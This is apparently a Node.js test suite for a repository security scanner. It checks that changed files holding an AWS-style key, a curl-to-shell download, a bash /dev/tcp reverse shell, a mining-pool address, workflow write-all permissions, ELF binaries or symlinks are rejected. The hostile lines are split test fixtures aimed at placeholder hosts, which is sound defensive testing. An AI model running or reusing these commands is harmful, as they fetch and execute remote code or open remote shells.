import test from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { scanChangedFiles } from '../security-scan.mjs';

const policy = {
  limits: { max_single_file_bytes: 1024 * 1024, max_changed_bytes: 2 * 1024 * 1024 },
  blocked_patterns: ['AKIA[0-9A-Z]{16}'],
  static_scan: { allowed_binary_extensions: ['.png', '.jpg', '.jpeg', '.gif', '.webp', '.ico'] }
};

async function scan(name, content, options = {}) {
  const root = await mkdtemp(join(tmpdir(), 'emergence-scan-'));
  const path = join(root, name);
  await mkdir(join(path, '..'), { recursive: true });
  await writeFile(path, content);
  return scanChangedFiles({ root, changedFiles: [name], policy: { ...policy, ...options.policy } });
}

test('ordinary source passes deterministic scan', async () => {
  const result = await scan('src/good.mjs', 'export function add(a, b) { return a + b; }\n');
  assert.equal(result.accepted, true);
});

test('secret pattern is blocked', async () => {
  const result = await scan('src/bad.mjs', 'const key = "AKIAABCDEFGHIJKLMNOP";\n');
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'secret-pattern'));
});

test('download piped to shell is blocked', async () => {
  const result = await scan('scripts/install.sh', ['cu', 'rl https://invalid.example/payload | sh\n'].join(''));
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'shell-download-pipe'));
});

test('reverse shell pattern is blocked', async () => {
  const result = await scan('scripts/connect.sh', ['bash -i >& /dev', '/tcp/example.invalid/4444 0>&1\n'].join(''));
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'reverse-shell-dev-tcp'));
});

test('crypto miner marker is blocked', async () => {
  const result = await scan('src/worker.js', ['const pool = "stratum', '+tcp://example.invalid";\n'].join(''));
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'crypto-miner'));
});

test('workflow write-all is blocked', async () => {
  const result = await scan('.github/workflows/unsafe.yml', ['permissions: write', '-all\n'].join(''));
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'workflow-write-all'));
});

test('unknown binary is blocked', async () => {
  const result = await scan('payload.bin', Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00, 0x01]));
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'unexpected-binary'));
});

test('valid png signature is allowed as a static asset', async () => {
  const result = await scan('assets/icon.png', Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0x00]));
  assert.equal(result.accepted, true);
});

test('symbolic link is blocked', async () => {
  const root = await mkdtemp(join(tmpdir(), 'emergence-scan-'));
  await writeFile(join(root, 'target.txt'), 'safe');
  await symlink('target.txt', join(root, 'link.txt'));
  const result = await scanChangedFiles({ root, changedFiles: ['link.txt'], policy });
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'symbolic-link'));
});

test('missing added path is blocked instead of mistaken for a deletion', async () => {
  const root = await mkdtemp(join(tmpdir(), 'emergence-scan-'));
  const result = await scanChangedFiles({ root, changedEntries: [{ path: 'missing.bin', status: 'added' }], policy });
  assert.equal(result.accepted, false);
  assert.ok(result.findings.some((finding) => finding.rule === 'missing-changed-path'));
});

test('removed path is accepted without content scanning', async () => {
  const root = await mkdtemp(join(tmpdir(), 'emergence-scan-'));
  const result = await scanChangedFiles({ root, changedEntries: [{ path: 'removed.txt', status: 'removed' }], policy });
  assert.equal(result.accepted, true);
});
